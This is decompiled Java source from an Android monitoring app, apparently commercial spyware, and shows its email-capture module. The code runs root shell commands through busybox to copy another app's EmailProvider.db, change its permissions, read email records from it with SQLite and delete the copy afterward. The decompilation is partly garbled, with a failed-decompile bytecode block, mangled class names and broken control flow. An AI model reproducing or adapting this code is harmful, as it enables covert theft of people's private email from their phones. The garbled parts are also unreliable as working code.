package com.vvt.capture.email.b.b;

import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.a.d;
import com.vvt.capture.email.generic.EmailEventReference;
import com.vvt.io.p;
import com.vvt.p.c;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final boolean c = com.vvt.ak.a.d;
  private String d;
  private d e;
  private long f = 0L;
  private String g;
  
  private String c()
  {
    return p.a(b(), "busybox");
  }
  
  private String d()
  {
    return com.vvt.capture.email.b.b.a(this.d);
  }
  
  private void e()
  {
    String str1 = d();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    l1 = 0L;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject = null;
    EmailEventReference localEmailEventReference = new com/vvt/capture/email/generic/EmailEventReference;
    localEmailEventReference.<init>();
    try
    {
      localObject = com.vvt.capture.email.b.b.a();
      bool2 = a;
      if (bool2) {}
      String str1 = "EmailProvider.db";
      String str2 = this.g;
      str1 = a(str1, (String)localObject, str2);
      boolean bool3 = com.vvt.ag.b.a(str1);
      if (bool3) {
        break label188;
      }
      l2 = com.vvt.capture.email.b.b.c(str1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4;
        boolean bool2 = b;
        if (bool2) {}
        long l2 = l1;
        continue;
        this.f = l2;
        continue;
        l2 = l1;
      }
    }
    e();
    bool4 = l2 < l1;
    if (!bool4)
    {
      bool2 = c;
      if (bool2) {}
      l2 = this.f;
      if (localObject == null) {
        localObject = "";
      }
      localEmailEventReference.setDatabasePath((String)localObject);
      localObject = Long.valueOf(l2);
      localEmailEventReference.setReference((Long)localObject);
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return localEmailEventReference;
    }
  }
  
  public String a(String paramString1, String paramString2, String paramString3)
  {
    bool1 = ShellUtil.b(paramString2);
    Object localObject1 = d();
    String str1 = p.a((String)localObject1, paramString1);
    String str2;
    int i;
    if (bool1)
    {
      str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      i = 5;
    }
    for (;;)
    {
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str3 = null;
        arrayOfObject[0] = localObject1;
        j = 1;
        arrayOfObject[j] = localObject1;
        j = 2;
        arrayOfObject[j] = paramString3;
        j = 3;
        arrayOfObject[j] = paramString3;
        j = 4;
        arrayOfObject[j] = localObject1;
        str2 = String.format(str2, arrayOfObject);
        KMShell.a(str2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k((String)localObject1);
        }
        str2 = "%s cp -f %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject1 = new Object[k];
        i = 0;
        arrayOfObject = null;
        str3 = c();
        localObject1[0] = str3;
        i = 1;
        localObject1[i] = paramString2;
        i = 2;
        localObject1[i] = str1;
        i = 3;
        localObject1[i] = str1;
        i = 4;
        localObject1[i] = paramString3;
        i = 5;
        localObject1[i] = paramString3;
        i = 6;
        localObject1[i] = str1;
        str2 = String.format(str2, (Object[])localObject1);
        KMShell.a(str2);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k(str1);
        }
        bool1 = a;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        boolean bool2 = false;
        Object localObject2 = null;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      return str1;
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      str1 = null;
    }
  }
  
  /* Error */
  public List a(int paramInt)
  {
    // Byte code:
    //   0: getstatic 22	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	Z
    //   3: istore_2
    //   4: iload_2
    //   5: ifeq +3 -> 8
    //   8: new 135	java/util/ArrayList
    //   11: astore_3
    //   12: aload_3
    //   13: invokespecial 136	java/util/ArrayList:<init>	()V
    //   16: invokestatic 74	com/vvt/capture/email/removeFromPath/removeFromPath:a	()Ljava/lang/String;
    //   19: astore 4
    //   21: getstatic 22	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	Z
    //   24: istore 5
    //   26: iload 5
    //   28: ifeq +3 -> 31
    //   31: ldc 76
    //   33: astore 6
    //   35: aload_0
    //   36: getfield 78	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   39: astore 7
    //   41: aload_0
    //   42: aload 6
    //   44: aload 4
    //   46: aload 7
    //   48: invokevirtual 81	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   51: astore 4
    //   53: aload 4
    //   55: invokestatic 113	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   58: pop
    //   59: getstatic 22	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	Z
    //   62: istore 5
    //   64: iload 5
    //   66: ifeq +3 -> 69
    //   69: aload 4
    //   71: invokestatic 86	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   74: istore 5
    //   76: iload 5
    //   78: ifne +218 -> 296
    //   81: iload_1
    //   82: aload 4
    //   84: invokestatic 139	com/vvt/capture/email/removeFromPath/removeFromPath:a	(ILjava/lang/String;)J
    //   87: lstore 8
    //   89: lconst_1
    //   90: lstore 10
    //   92: lload 8
    //   94: lload 10
    //   96: lsub
    //   97: lstore 8
    //   99: aload 4
    //   101: invokestatic 89	com/vvt/capture/email/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	(Ljava/lang/String;)J
    //   104: lstore 10
    //   106: getstatic 22	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	Z
    //   109: istore 12
    //   111: iload 12
    //   113: ifeq +3 -> 116
    //   116: bipush 17
    //   118: istore 12
    //   120: iload 12
    //   122: aload 4
    //   124: invokestatic 147	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   127: astore 4
    //   129: aload_0
    //   130: getfield 48	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:d	Ljava/lang/String;
    //   133: astore 13
    //   135: aload_0
    //   136: getfield 78	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   139: astore 14
    //   141: aload 4
    //   143: lload 8
    //   145: lload 10
    //   147: aload 13
    //   149: aload 14
    //   151: invokestatic 150	com/vvt/capture/email/removeFromPath/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;JJLjava/lang/String;Ljava/lang/String;)Ljava/util/List;
    //   154: astore 6
    //   156: getstatic 22	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	Z
    //   159: istore 15
    //   161: iload 15
    //   163: ifeq +3 -> 166
    //   166: aload_3
    //   167: aload 6
    //   169: invokeinterface 156 2 0
    //   174: pop
    //   175: aload_0
    //   176: invokespecial 91	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:e	()V
    //   179: aload 4
    //   181: ifnull +8 -> 189
    //   184: aload 4
    //   186: invokevirtual 161	android/database/sqlite/SQLiteDatabase:close	()V
    //   189: iconst_0
    //   190: ifeq +7 -> 197
    //   193: aconst_null
    //   194: invokevirtual 161	android/database/sqlite/SQLiteDatabase:close	()V
    //   197: getstatic 22	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:a	Z
    //   200: istore_2
    //   201: iload_2
    //   202: ifeq +3 -> 205
    //   205: aload_3
    //   206: areturn
    //   207: astore 4
    //   209: iconst_0
    //   210: istore_2
    //   211: aconst_null
    //   212: astore 4
    //   214: getstatic 26	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:removeFromPath	Z
    //   217: istore 5
    //   219: iload 5
    //   221: ifeq +3 -> 224
    //   224: aload_0
    //   225: invokespecial 91	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:e	()V
    //   228: aload 4
    //   230: ifnull +8 -> 238
    //   233: aload 4
    //   235: invokevirtual 161	android/database/sqlite/SQLiteDatabase:close	()V
    //   238: iconst_0
    //   239: ifeq -42 -> 197
    //   242: goto -49 -> 193
    //   245: astore 4
    //   247: iconst_0
    //   248: istore 5
    //   250: aconst_null
    //   251: astore 6
    //   253: aload_0
    //   254: invokespecial 91	com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath:e	()V
    //   257: aload 6
    //   259: ifnull +8 -> 267
    //   262: aload 6
    //   264: invokevirtual 161	android/database/sqlite/SQLiteDatabase:close	()V
    //   267: iconst_0
    //   268: ifeq +7 -> 275
    //   271: aconst_null
    //   272: invokevirtual 161	android/database/sqlite/SQLiteDatabase:close	()V
    //   275: aload 4
    //   277: athrow
    //   278: astore 16
    //   280: aload 4
    //   282: astore 6
    //   284: aload 16
    //   286: astore 4
    //   288: goto -35 -> 253
    //   291: astore 6
    //   293: goto -79 -> 214
    //   296: iconst_0
    //   297: istore_2
    //   298: aconst_null
    //   299: astore 4
    //   301: goto -126 -> 175
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	304	0	this	removeFromPath
    //   0	304	1	paramInt	int
    //   3	295	2	bool1	boolean
    //   11	195	3	localArrayList	ArrayList
    //   19	166	4	localObject1	Object
    //   207	1	4	localException1	Exception
    //   212	22	4	localObject2	Object
    //   245	36	4	localObject3	Object
    //   286	14	4	localObject4	Object
    //   24	225	5	bool2	boolean
    //   33	250	6	localObject5	Object
    //   291	1	6	localException2	Exception
    //   39	8	7	str1	String
    //   87	57	8	l1	long
    //   90	56	10	l2	long
    //   109	3	12	bool3	boolean
    //   118	3	12	i	int
    //   133	15	13	str2	String
    //   139	11	14	str3	String
    //   159	3	15	bool4	boolean
    //   278	7	16	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   16	19	207	java/lang/Exception
    //   21	24	207	java/lang/Exception
    //   35	39	207	java/lang/Exception
    //   46	51	207	java/lang/Exception
    //   53	59	207	java/lang/Exception
    //   59	62	207	java/lang/Exception
    //   69	74	207	java/lang/Exception
    //   82	87	207	java/lang/Exception
    //   99	104	207	java/lang/Exception
    //   106	109	207	java/lang/Exception
    //   122	127	207	java/lang/Exception
    //   16	19	245	finally
    //   21	24	245	finally
    //   35	39	245	finally
    //   46	51	245	finally
    //   53	59	245	finally
    //   59	62	245	finally
    //   69	74	245	finally
    //   82	87	245	finally
    //   99	104	245	finally
    //   106	109	245	finally
    //   122	127	245	finally
    //   129	133	278	finally
    //   135	139	278	finally
    //   149	154	278	finally
    //   156	159	278	finally
    //   167	175	278	finally
    //   214	217	278	finally
    //   129	133	291	java/lang/Exception
    //   135	139	291	java/lang/Exception
    //   149	154	291	java/lang/Exception
    //   156	159	291	java/lang/Exception
    //   167	175	291	java/lang/Exception
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof EmailEventReference;
    if (bool1) {}
    for (;;)
    {
      try
      {
        paramg1 = (EmailEventReference)paramg1;
        Object localObject1 = paramg1.getReference();
        long l1 = ((Long)localObject1).longValue();
        paramg2 = (EmailEventReference)paramg2;
        localObject1 = paramg2.getReference();
        long l2 = ((Long)localObject1).longValue();
        long l3 = l2 - l1;
        long l4 = 0L;
        bool1 = l1 < l4;
        if (bool1)
        {
          l4 = 3;
          bool1 = l3 < l4;
          if (!bool1) {}
        }
        else
        {
          l3 = 5000L;
          SystemClock.sleep(l3);
        }
        localObject1 = com.vvt.capture.email.b.b.a();
        boolean bool2 = a;
        if (bool2) {}
        String str1 = "EmailProvider.db";
        String str2 = this.g;
        str1 = a(str1, (String)localObject1, str2);
        ShellUtil.b(str1);
        bool1 = a;
        if (bool1) {}
        bool1 = com.vvt.ag.b.a(str1);
        if (bool1) {
          break label329;
        }
        bool1 = a;
        if (bool1) {}
        bool1 = false;
        localObject1 = null;
        int i = 17;
        List localList;
        boolean bool3;
        boolean bool4;
        ((SQLiteDatabase)localObject3).close();
      }
      catch (Exception localException1)
      {
        try
        {
          localObject1 = c.a(i, str1);
          if (localObject3 == null) {}
        }
        catch (Exception localException2)
        {
          try
          {
            str1 = this.d;
            str2 = this.g;
            localList = com.vvt.capture.email.b.b.a((SQLiteDatabase)localObject1, l1, l2, str1, str2);
            bool3 = a;
            if (bool3) {}
            localArrayList.addAll(localList);
            if (localObject1 != null) {
              ((SQLiteDatabase)localObject1).close();
            }
            e();
            bool1 = a;
            if (bool1) {}
            return localArrayList;
          }
          finally
          {
            for (;;)
            {
              Object localObject3 = localObject2;
              Object localObject2 = localObject5;
            }
          }
          localException2 = localException2;
          bool4 = b;
          if ((bool4) && (localObject1 == null)) {
            continue;
          }
          ((SQLiteDatabase)localObject1).close();
          continue;
          localException1 = localException1;
          bool1 = b;
          if (!bool1) {
            continue;
          }
          continue;
        }
        finally
        {
          localObject4 = finally;
          bool4 = false;
          localObject3 = null;
          localObject2 = localObject4;
        }
      }
      throw ((Throwable)localObject2);
      label329:
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public void a(d paramd)
  {
    this.e = paramd;
  }
  
  public void a(String paramString)
  {
    this.g = paramString;
  }
  
  public String b()
  {
    return this.d;
  }
  
  public void b(String paramString)
  {
    this.d = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */